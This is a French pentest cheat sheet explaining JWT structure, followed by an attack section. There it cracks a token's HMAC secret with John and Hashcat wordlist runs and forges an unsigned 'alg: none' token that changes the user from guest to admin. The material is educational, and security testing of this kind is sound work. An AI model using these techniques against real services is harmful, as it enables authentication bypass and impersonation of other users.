# JWT session Token

Les JWT se composent de trois parties séparées par des points (`.`) :

* **En-tête**
* **Charge utile (payload)**
* **Signature**

Par conséquent, un JWT typique ressemble à ceci.

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.OnuZnYMdetcg7AWGV6WURn8CFSfas6AQej4V9M13nsk

Examinons ces différents composants.

## En-tête

L'en-tête se compose _généralement_ de deux parties : le type de jeton, qui est JWT, et l'algorithme de hachage, tel que HMAC SHA256 ou RSA.

Exemple :

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

Cette syntaxe JSON est encodée en **Base64Url** pour former la première partie du jeton JWT.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
```

## Charge utile

La deuxième partie du jeton est la charge utile, qui contient les revendications. Les revendications dépendent d'une entité (généralement, l'utilisateur), avec des métadonnées supplémentaires. Trois types de revendications sont disponibles : _réservées_, _publiques_ et _privées_.

* **Les revendications réservées** : Ce type regroupe des revendications prédéfinies, qui ne sont pas obligatoires, mais recommandées, conçues pour fournir un ensemble de revendications utiles et interopérables. Elles peuvent inclure : **iss** (issuer ou émetteur), **exp** (délai d'expiration), **sub** (sujet), **aud** (audience), entre autres.

> Remarquez que les noms des revendications ne comportent que trois caractères, car un jeton JWT doit être compact.

* **Les revendications publiques** : Ce type peut être défini à volonté par les utilisateurs de jetons JWT. Mais pour éviter les collisions, ils doivent être définis dans le registre IANA JSON Web Token ou être définis comme une URI qui contient un espace de nom résistant aux collisions.
* **Les revendications privées** : Ce type réunit des revendications personnalisées, qui servent à partager des informations entre les parties qui ont convenus entre elles de les utiliser.

Exemple :&#x20;

```json
{
  "username": "guest"
}
```

La charge utile est ensuite codée en **Base64Url** pour former la deuxième partie du JWT.

```
eyJ1c2VybmFtZSI6Imd1ZXN0In0
```

## Signature

La signature prend en entrées :

* l'en-tête encodée en Base64URL
* la charge utile encodée en Base64URL
* un code secret

L'algorithme utilisé pour générer la signature est celui précisé dans l'en-tête.

```
HMACSHA256(
  base64UrlEncode(header) + '.' +
  base64UrlEncode(payload),
  secret)
```

La signature sert à vérifier que l'expéditeur du JWT est bien celui qu'il prétend être et à s'assurer que le message n'a pas été modifié en cours de route.

## Attaques

### Casser le secret associé à la clé

Via John :&#x20;

```
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
john jwt.txt --show
```

Via Hashcat :

```
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt 
```

### Passer le type d'algorithme de signature à "None"

* Décoder l'en-tête légitime

```bash
echo eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9 | base64 -d                                    
{"typ":"JWT","alg":"HS256"}#                                                         
```

* Décoder la charge utile légitime

```bash
echo eyJ1c2VybmFtZSI6Imd1ZXN0In0 | base64 -d
{"username":"guest"}base64: invalid input
```

\-> l'erreur est liée au fait que l'algorithme utilise la base64URL avec la suppression du padding "=" du base64 original

* Encoder une en-tête malveillante avec l'algorithme de signature à none

```bash
echo -n '{"typ":"JWT","alg":"none"}' | base64
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=

```

* Encoder une charge utilie malveillante

```bash
echo -n '{"username":"admin"}' | base64
eyJ1c2VybmFtZSI6ImFkbWluIn0=
```

* Forger un token en supprimant les "=" et en gardant uniquement le dernier "." pour la partie signature

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.
```
